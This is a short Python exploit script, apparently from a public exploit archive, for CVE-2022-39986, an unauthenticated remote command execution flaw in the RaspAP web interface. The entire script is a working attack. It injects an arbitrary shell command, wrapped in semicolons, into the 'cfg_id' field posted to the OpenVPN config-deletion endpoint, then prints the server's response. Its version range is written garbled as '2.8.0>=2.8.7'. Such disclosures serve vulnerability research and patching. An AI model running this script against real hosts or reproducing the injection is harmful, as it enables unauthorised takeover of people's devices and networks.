# Exploit Title: RaspAP - Remote Code Execution (RCE) (Unauthenticated)
# Date: Aug 2022
# CVE-ID: CVE-2022–39986
# Author: Ismael0x00 <https://twitter.com/ismael0x00>
# Vendor Homepage: https://raspap.com/
# Software Link: https://github.com/RaspAP/raspap-webgui
# Version: 2.8.0>=2.8.7
# Tested on: Linux raspberrypi 5.10.*

import requests
from requests.api import post
import sys, re

if len(sys.argv) != 4:
    print("python3 attack.py <target-host> <target-port> <command>")
    sys.exit()
else:  
    target_host = sys.argv[1]
    target_port = sys.argv[2]
    command = ";"+sys.argv[3]+";"

    endpoint = "ajax/openvpn/del_ovpncfg.php"
    url = "http://{}:{}/{}".format(target_host,target_port,endpoint)

    s = requests.Session()
    post_data = {
        "cfg_id": command
    }
    post_Request = s.post(url, data=post_data)
    if post_Request.status_code==200:
        print("[*] Sending command ... ")
        print(post_Request.text)
        print("Done")
    else:
     print("Error.["+post_Request.text+"]")